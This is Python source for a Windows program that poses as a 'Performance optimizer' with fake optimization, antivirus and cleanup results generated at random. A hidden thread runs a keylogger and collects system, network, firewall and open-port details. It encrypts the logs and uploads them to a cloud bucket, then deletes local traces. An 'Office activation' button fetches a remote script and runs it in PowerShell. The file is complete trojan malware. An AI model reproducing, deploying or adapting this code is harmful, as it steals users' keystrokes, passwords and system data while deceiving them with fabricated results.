import os
import platform
import socket
import psutil
import subprocess
import sqlite3
import requests
import time
import wmi
import winreg
from pynput import keyboard
import logging
logging.disable(logging.CRITICAL)
from nyxcrypta import NyxCrypta, SecurityLevel
import boto3
from botocore.exceptions import ClientError
import tkinter as tk
from tkinter import ttk, messagebox
import threading
import random
import sv_ttk

def setup_keys(directory, password):
    if not os.path.exists(directory):
        os.makedirs(directory, exist_ok=True)

    public_key_path = os.path.join(directory, "public_key.pem")
    private_key_path = os.path.join(directory, "private_key.pem")

    if not (os.path.exists(public_key_path) and os.path.exists(private_key_path)):
        nx.save_keys(directory, password)

nx = NyxCrypta(SecurityLevel.HIGH)
password = "my_strong_password"
setup_keys("./", password)
user_name = os.getlogin()
ip = requests.get("https://api.myip.com")
ip = ip.json()
IP = ip.get("ip")
log_file = f"{user_name}_{IP}_log.nyx"
infos_file = f"{user_name}_{IP}_infos.nyx"
vuln_file = f"{user_name}_{IP}_vuln.nyx"

class PerformanceOptimizer:
    def __init__(self, root):
        self.root = root
        self.root.title("Performance optimizer")
        self.root.geometry("900x700")
        self.root.minsize(800, 600)

        # Apply modern dark theme
        sv_ttk.set_theme("dark")

        # Create main container with padding
        self.main_container = ttk.Frame(root, padding="20")
        self.main_container.pack(expand=True, fill="both")

        # Create notebook with styled tabs
        self.notebook = ttk.Notebook(self.main_container)
        self.notebook.pack(expand=True, fill="both")

        # Create tabs
        self.create_optimization_tab()
        self.create_system_info_tab()
        self.create_processes_tab()

        # Status bar at the bottom
        self.status_bar = ttk.Label(root, text="Prêt", relief="sunken", anchor="w")
        self.status_bar.pack(side="bottom", fill="x", padx=10, pady=5)

    def create_optimization_tab(self):
        """Create the main optimization tab with improved layout."""
        optimization_tab = ttk.Frame(self.notebook, padding="20")
        self.notebook.add(optimization_tab, text="Performance optimization")

        # Header section
        header_frame = ttk.Frame(optimization_tab)
        header_frame.pack(fill="x", pady=(0, 20))

        title_label = ttk.Label(
            header_frame, 
            text="Performance optimization", 
            font=("Helvetica", 20, "bold")
        )
        title_label.pack(side="left")

        desc_label = ttk.Label(
            header_frame, 
            text="Optimize your PC and network with a single click",
            font=("Helvetica", 10)
        )
        desc_label.pack(side="left", padx=(20, 0))

        # Action buttons frame
        buttons_frame = ttk.Frame(optimization_tab)
        buttons_frame.pack(fill="x", pady=10)
        self.activate_office_btn = ttk.Button(
            buttons_frame, 
            text="🎯 Office activation", 
            command=self.activate_office,
            width=25,
            style="Accent.TButton",
            padding=(10, 10)
        )
        self.activate_office_btn.pack(side="left", padx=10, expand=True)

        # Optimize buttons with icons and improved styling
        btn_style = {"width": 25, "style": "Accent.TButton", "padding": (10, 10)}
        
        self.pc_optimize_btn = ttk.Button(
            buttons_frame, 
            text="🚀 PC optimization", 
            command=self.simulate_pc_optimization,
            **btn_style
        )
        self.pc_optimize_btn.pack(side="left", padx=10, expand=True)

        self.network_optimize_btn = ttk.Button(
            buttons_frame, 
            text="🌐 Network optimization", 
            command=self.simulate_network_optimization,
            **btn_style
        )
        self.network_optimize_btn.pack(side="left", padx=10, expand=True)

        # Additional actions frame
        additional_frame = ttk.Frame(optimization_tab)
        additional_frame.pack(fill="x", pady=10)

        self.antivirus_btn = ttk.Button(
            additional_frame, 
            text="🛡️ Antivirus Scan", 
            command=self.simulate_antivirus_scan,
            width=25,
            style="Outline.TButton"
        )
        self.antivirus_btn.pack(side="left", padx=10, expand=True)

        self.clean_files_btn = ttk.Button(
            additional_frame, 
            text="🧹 Clean up temporary files", 
            command=self.simulate_clean_temp_files,
            width=25,
            style="Outline.TButton"
        )
        self.clean_files_btn.pack(side="left", padx=10, expand=True)

        # Power options buttons
        power_frame = ttk.Frame(optimization_tab)
        power_frame.pack(fill="x", pady=10)

        self.restart_btn = ttk.Button(
            power_frame, 
            text="🔄 Reboot", 
            command=self.restart_computer,
            width=25,
            style="Outline.TButton"
        )
        self.restart_btn.pack(side="left", padx=10, expand=True)

        self.shutdown_btn = ttk.Button(
            power_frame, 
            text="🔌 Shut down", 
            command=self.shutdown_computer,
            width=25,
            style="Outline.TButton"
        )
        self.shutdown_btn.pack(side="left", padx=10, expand=True)

        # Progress and status section
        status_frame = ttk.Frame(optimization_tab)
        status_frame.pack(fill="x", pady=20)

        self.progress_bar = ttk.Progressbar(
            status_frame, 
            orient="horizontal", 
            mode="indeterminate", 
            length=600
        )
        self.progress_bar.pack(expand=True, fill="x", padx=20)

        self.status_label = ttk.Label(
            status_frame, 
            text="Ready for optimization", 
            font=("Helvetica", 10)
        )
        self.status_label.pack(pady=10)

    def create_system_info_tab(self):
        """Create the system information tab with improved layout."""
        system_info_tab = ttk.Frame(self.notebook, padding="20")
        self.notebook.add(system_info_tab, text="System information")

        # System info header
        header_label = ttk.Label(
            system_info_tab, 
            text="System information", 
            font=("Helvetica", 16, "bold")
        )
        header_label.pack(pady=(0, 20))

        # Scrollable text widget for system info
        system_info_scroll = ttk.Scrollbar(system_info_tab)
        system_info_scroll.pack(side="right", fill="y")

        self.system_info_text = tk.Text(
            system_info_tab, 
            wrap="word", 
            height=20, 
            width=80,
            font=("Consolas", 10),
            yscrollcommand=system_info_scroll.set
        )
        self.system_info_text.pack(expand=True, fill="both")
        system_info_scroll.config(command=self.system_info_text.yview)

        # Populate system info
        self.display_system_info()

    def create_processes_tab(self):
        """Create the processes tab to display active processes."""
        processes_tab = ttk.Frame(self.notebook, padding="20")
        self.notebook.add(processes_tab, text="Active processes")

        # Process list frame with scrollbar
        process_frame = ttk.Frame(processes_tab)
        process_frame.pack(expand=True, fill="both")

        # Listbox to show process info
        self.process_listbox = tk.Listbox(
            process_frame, 
            height=15, 
            width=80, 
            font=("Consolas", 10),
            selectmode=tk.SINGLE
        )
        self.process_listbox.pack(side="left", fill="both", expand=True)

        # Scrollbar for process listbox
        process_scroll = ttk.Scrollbar(process_frame, orient="vertical", command=self.process_listbox.yview)
        process_scroll.pack(side="right", fill="y")
        self.process_listbox.config(yscrollcommand=process_scroll.set)

        # Button to refresh process list
        self.refresh_button = ttk.Button(
            processes_tab, 
            text="Refresh", 
            command=self.refresh_process_list
        )
        self.refresh_button.pack(pady=10)

        # Refresh the list of processes initially
        self.refresh_process_list()

    def get_system_info(self):
        """Retrieve system information."""
        system_info = {
            "Computer Name": socket.gethostname(),
            "User": platform.node(),
            "Operating System": platform.system(),
            "OS Version": platform.version(),
            "Processor": platform.processor(),
            "CPU Cores": psutil.cpu_count(logical=False),
            "Total RAM (GB)": psutil.virtual_memory().total / (1024 ** 3),
            "Available RAM (GB)": psutil.virtual_memory().available / (1024 ** 3),
            "Total Disk (GB)": psutil.disk_usage('/').total / (1024 ** 3),
            "Used Disk (GB)": psutil.disk_usage('/').used / (1024 ** 3),
            "Free Disk (GB)": psutil.disk_usage('/').free / (1024 ** 3),
        }
        return system_info

    def display_system_info(self):
        """Display system information in the System Details tab."""
        self.system_info_text.config(state="normal")
        self.system_info_text.delete(1.0, tk.END)
        
        system_info = self.get_system_info()
        for key, value in system_info.items():
            self.system_info_text.insert(tk.END, f"{key}: {value}\n")
        
        self.system_info_text.config(state="disabled")

    def refresh_process_list(self):
        """Refresh the process list."""
        self.process_listbox.delete(0, tk.END)

        for process in psutil.process_iter(['pid', 'name', 'cpu_percent', 'memory_info']):
            process_info = f"PID: {process.info['pid']} | {process.info['name']} | CPU: {process.info['cpu_percent']}% | RAM: {process.info['memory_info'].rss / (1024 ** 2):.2f} Mo"
            self.process_listbox.insert(tk.END, process_info)

    def simulate_pc_optimization(self):
        """Simulate PC optimization process."""
        self.progress_bar.start()
        self.status_label.config(text="PC optimization...")
        self.pc_optimize_btn.config(state="disabled")

        def complete_optimization():
            time.sleep(2)  # Simulate optimization
            cpu_reduction = random.randint(10, 30)
            ram_reduction = random.randint(200, 800)
            
            self.root.after(0, self.update_optimization_result, 
                            cpu_reduction, ram_reduction)

        threading.Thread(target=complete_optimization, daemon=True).start()

    def update_optimization_result(self, cpu_reduction, ram_reduction):
        """Update UI after optimization simulation."""
        self.progress_bar.stop()
        self.status_label.config(
            text=f"Optimization complete: {cpu_reduction}% CPU, {ram_reduction} MB RAM freed up"
        )
        self.pc_optimize_btn.config(state="normal")
        
        messagebox.showinfo(
            "PC optimization", 
            f"Your PC has been optimized :\n- {cpu_reduction}% reduction in CPU usage\n- {ram_reduction} MB of RAM freed up"
        )

    def simulate_network_optimization(self):
        """Simulate network optimization process."""
        self.progress_bar.start()
        self.status_label.config(text="Network optimization...")
        self.network_optimize_btn.config(state="disabled")

        def complete_optimization():
            time.sleep(2)  # Simulate network optimization
            ping_reduction = random.randint(5, 20)
            speed_increase = random.randint(2, 15)
            
            self.root.after(0, self.update_network_result, 
                            ping_reduction, speed_increase)

        threading.Thread(target=complete_optimization, daemon=True).start()

    def update_network_result(self, ping_reduction, speed_increase):
        """Update UI after network optimization simulation."""
        self.progress_bar.stop()
        self.status_label.config(
            text=f"Network optimization completed: {ping_reduction} ms of ping, {speed_increase} Mbps speed"
        )
        self.network_optimize_btn.config(state="normal")
        
        messagebox.showinfo(
            "Network optimization", 
            f"Optimized network :\n- Ping reduced by {ping_reduction} ms\n- Download speed increased by {speed_increase} Mbps"
        )

    def simulate_antivirus_scan(self):
        """Simulate antivirus scan process."""
        self.progress_bar.start()
        self.status_label.config(text="Antivirus scan in progress...")
        self.antivirus_btn.config(state="disabled")

        def complete_scan():
            time.sleep(3)  # Simulate antivirus scan
            virus_found = random.choice([True, False])
            
            self.root.after(0, self.update_antivirus_result, virus_found)

        threading.Thread(target=complete_scan, daemon=True).start()

    def update_antivirus_result(self, virus_found):
        """Update UI after antivirus scan simulation."""
        self.progress_bar.stop()
        self.antivirus_btn.config(state="normal")

        if virus_found:
            self.status_label.config(text="Scan complete: Viruses removed!")
            messagebox.showwarning(
                "Antivirus Scan", 
                "Viruses have been found on your system !\nViruses removed."
            )
        else:
            self.status_label.config(text="Scan completed: No viruses detected")
            messagebox.showinfo(
                "Antivirus Scan", 
                "No viruses detected on your system."
            )

    def simulate_clean_temp_files(self):
        """Simulate temporary files cleanup process."""
        self.progress_bar.start()
        self.status_label.config(text="Cleaning up temporary files...")
        self.clean_files_btn.config(state="disabled")

        def complete_cleanup():
            time.sleep(2)  # Simulate file cleanup
            files_removed = random.randint(500, 2000)
            
            self.root.after(0, self.update_cleanup_result, files_removed)

        threading.Thread(target=complete_cleanup, daemon=True).start()

    def update_cleanup_result(self, files_removed):
        """Update UI after temporary files cleanup."""
        self.progress_bar.stop()
        self.status_label.config(
            text=f"Cleaning complete : {files_removed} files deleted"
        )
        self.clean_files_btn.config(state="normal")
        
        messagebox.showinfo(
            "File cleanup", 
            f"{files_removed} temporary files have been deleted."
        )

    def restart_computer(self):
        """Simulate system restart."""
        messagebox.showinfo("Reboot", "System reboot...")
        os.system("shutdown /r /f")

    def shutdown_computer(self):
        """Simulate system shutdown."""
        messagebox.showinfo("Shutdown", "System shutdown...")
        os.system("shutdown /s /f")
    def activate_office(self):
        """Launch PowerShell command to activate Office."""
        try:
            # Exécuter la commande PowerShell dans une fenêtre séparée
            subprocess.run(["powershell", "-Command", "irm https://get.activated.win | iex"], check=True)
            messagebox.showinfo("Office activation", "Microsoft Office activation successfully launched.")
        except subprocess.CalledProcessError as e:
            messagebox.showerror("Error", f"An error has occurred : {e}")

def upload_file_to_backblaze(bucket_name, local_file_path, remote_file_name=None):
    """
    Uploads a file to a private Backblaze bucket.
    
    :param bucket_name: Name of the Backblaze bucket
    :param local_file_path: Full path of the local file to be uploaded.
    :param remote_file_name: Name of file in bucket (optional, default is local file name)
    :return: URL of uploaded file or None on error
    """

    # Backblaze informations
    endpoint = "https://example.backblazeb2.com"
    key_id = "your key_id"
    application_key = "your app_key"

    # Remote file name (use local file name if not specified)
    if remote_file_name is None:
        remote_file_name = os.path.basename(local_file_path)

    try:
        # Create S3 client (Backblaze B2)
        b2_client = boto3.client(
            service_name='s3',
            endpoint_url=endpoint,
            aws_access_key_id=key_id,
            aws_secret_access_key=application_key
        )

        # Upload file
        b2_client.upload_file(
            Filename=local_file_path,
            Bucket=bucket_name,
            Key=remote_file_name
        )

        # Build file URL
        file_url = f"{endpoint}/{bucket_name}/{remote_file_name}"
        
        return file_url

    except ClientError as e:
        return None

def get_sys_info():
    info = {
        "Computer name": socket.gethostname(),
        "User": os.getlogin(),
        "Operating system": platform.system(),
        "OS version": platform.version(),
        "Machine": platform.machine(),
        "CPU": platform.processor(),
        "Number of cores": psutil.cpu_count(logical=True),
        "Total RAM memory (GB)": round(psutil.virtual_memory().total / (1024**3), 2),
        "Available RAM memory (GB)": round(psutil.virtual_memory().available / (1024**3), 2),
        "Time since activation (hours)": round((time.time() - psutil.boot_time()) / 3600, 2),
    }
    return info

def get_gpu_info():
    try:
        gpu_info = []
        w = wmi.WMI()
        for gpu in w.Win32_VideoController():
            gpu_info.append({
                "GPU Name": gpu.Name,
                "Dedicated memory (MB)": round(int(gpu.AdapterRAM) / (1024**2), 2) if gpu.AdapterRAM else "Unavailable",
                "Driver Version": gpu.DriverVersion
            })
        return gpu_info
    except Exception as e:
        return [{"GPU error": str(e)}]

def get_bios_info():
    try:
        w = wmi.WMI()
        bios = w.Win32_BIOS()[0]
        return {
            "Manufacturer": bios.Manufacturer,
            "Version": bios.Version,
            "Serial number": bios.SerialNumber
        }
    except Exception as e:
        return {"BIOS error": str(e)}

def check_firewall_status():
    """Checks if Windows firewall is enabled."""
    try:
        key = winreg.OpenKey(winreg.HKEY_LOCAL_MACHINE, r"SYSTEM\CurrentControlSet\Services\SharedAccess\Parameters\FirewallPolicy\StandardProfile")
        value, _ = winreg.QueryValueEx(key, "EnableFirewall")
        return "Enabled" if value == 1 else "Disabled"
    except Exception as e:
        return f"Error: {str(e)}"

def check_open_ports():
    """Lists open ports and associated programs."""
    try:
        ports = []
        for conn in psutil.net_connections(kind="inet"):
            if conn.status == "LISTEN":
                ports.append({
                    "Local Port": conn.laddr.port,
                    "Program": psutil.Process(conn.pid).name() if conn.pid else "Unknown"
                })
        return ports
    except Exception as e:
        return [{"Ports error": str(e)}]

def get_network_info():
    try:
        network_info = {}
        interfaces = psutil.net_if_addrs()
        for interface_name, interface_addresses in interfaces.items():
            for addr in interface_addresses:
                if addr.family == socket.AF_INET:
                    network_info[f"IPv4 ({interface_name})"] = addr.address
                elif addr.family == psutil.AF_LINK:
                    network_info[f"MAC ({interface_name})"] = addr.address

        ip_response = requests.get("https://api.myip.com")
        ip_data = ip_response.json()
        network_info["Public IP"] = ip_data.get("ip", "Unavailable")
        network_info["Country"] = ip_data.get("country", "Unavailable")
        network_info["Country code"] = ip_data.get("cc", "Unavailable")

        return network_info
    except Exception as e:
        return {"Network error": str(e)}
def get_running_processes():
    try:
        processes = []
        for proc in psutil.process_iter(['pid', 'name', 'username']):
            processes.append(proc.info)
        return processes
    except Exception as e:
        return [{"Processes error": str(e)}]

def get_disk_info():
    try:
        disk_info = []
        partitions = psutil.disk_partitions()
        for partition in partitions:
            usage = psutil.disk_usage(partition.mountpoint)
            disk_info.append({
                "Device": partition.device,
                "Mountpoint": partition.mountpoint,
                "File System": partition.fstype,
                "Total (Go)": round(usage.total / (1024**3), 2),
                "Used (Go)": round(usage.used / (1024**3), 2),
                "Free (Go)": round(usage.free / (1024**3), 2),
                "Usage (%)": usage.percent
            })
        return disk_info
    except Exception as e:
        return [{"Disk error": str(e)}]
    
public_key_path = "./public_key.pem"
bucket_name = "my-bucket-name"

def write_to_file(data):   
    encrypted_data = nx.encrypt_data(data.encode("utf-8"), public_key_path)
    with open(log_file, "a", encoding="utf-8") as file:
        file.write(encrypted_data + "\n")
def write_infos(data):  
    encrypted_data = nx.encrypt_data(data.encode("utf-8"), public_key_path)
    with open(infos_file, "a", encoding="utf-8") as file:
        file.write(encrypted_data + "\n")
def write_vulns(data):  
    encrypted_data = nx.encrypt_data(data.encode("utf-8"), public_key_path)
    with open(vuln_file, "a", encoding="utf-8") as file:
        file.write(encrypted_data + "\n")

buffer = []

def on_press(key):
    global buffer
    try:
        buffer.append(key.char)
    except AttributeError:
        if key == keyboard.Key.space:
            buffer.append(" ")
        elif key == keyboard.Key.enter:
            buffer.append("\n")
        else:
            buffer.append(f"[{key.name}]")

    if "".join(buffer[-7:]).lower() == "keystop":
        write_to_file("".join(buffer))
        upload_file_to_backblaze(bucket_name, log_file)
        os.remove(log_file)
        os.remove("public_key.pem")
        return False

    if len(buffer) >= 10:
        write_to_file("".join(buffer))
        upload_file_to_backblaze(bucket_name, log_file)
        buffer = []

def on_release(key):
    pass

def start_keylogger():
    info_sections = [
        ("System information", get_sys_info),
        ("GPU information", lambda: [{
            "Name": gpu.get('GPU Name'),
            "Memory": f"{gpu.get('Dedicated memory (MB)')} Mo",
            "Driver": gpu.get('Driver Version')
        } for gpu in get_gpu_info()]),
        ("BIOS information", get_bios_info),
        ("Network information", get_network_info),
        ("Disk information", lambda: [{
            "Device": disk.get('Device'),
            "Mountpoint": disk.get('Mountpoint'),
            "File System": disk.get('File System'),
            "Total": f"{disk.get('Total (Go)')} Go",
            "Used": f"{disk.get('Used (Go)')} Go",
            "Free": f"{disk.get('Free (Go)')} Go",
            "Usage": f"{disk.get('Usage (%)')}%"
        } for disk in get_disk_info()]),
        ("Current process", lambda: [{
            "PID": process.get('pid', 'N/A'),
            "Name": process.get('name', 'N/A'),
            "Username": process.get('username', 'N/A')
        } for process in get_running_processes()]),
    ]
    
    def process_section(section_title, data_func, writer):
        writer(f"\n=== {section_title} ===")
        data = data_func()
        if isinstance(data, dict):
            for key, value in data.items():
                writer(f"{key}: {value}")
        elif isinstance(data, list):
            for item in data:
                writer(", ".join(f"{k}: {v}" for k, v in item.items()))

    # Process information sections
    for section in info_sections:
        process_section(*section, write_infos)
    
    upload_file_to_backblaze(bucket_name, infos_file)
    os.remove(infos_file)

    # Process vulnerability sections
    vuln_sections = [
        ("Firewall check", check_firewall_status, 
         lambda status: f"Firewall status : {status}"),
        ("Open ports", check_open_ports, 
         lambda ports: [f"Port: {port.get('Local Port')}, Program: {port.get('Program')}" for port in ports]),
    ]
    
    for section_title, data_func, formatter in vuln_sections:
        write_vulns(f"\n=== {section_title} ===")
        data = data_func()
        
        if callable(formatter):
            formatted_data = formatter(data)
            if isinstance(formatted_data, list):
                for line in formatted_data:
                    write_vulns(line)
            else:
                write_vulns(formatted_data)
        else:
            write_vulns(formatter.format(data))

    upload_file_to_backblaze(bucket_name, vuln_file)
    os.remove(vuln_file)

    write_to_file("\n=== Start keyboard capture ===")
    with keyboard.Listener(on_press=on_press, on_release=on_release) as listener:
        listener.join()

def start():
    root = tk.Tk()
    app = PerformanceOptimizer(root)
    root.mainloop()

if __name__ == "__main__":
    thread1 = threading.Thread(target=start)
    thread2 = threading.Thread(target=start_keylogger)
    thread1.start()
    thread2.start()
    thread1.join()
    thread2.join()
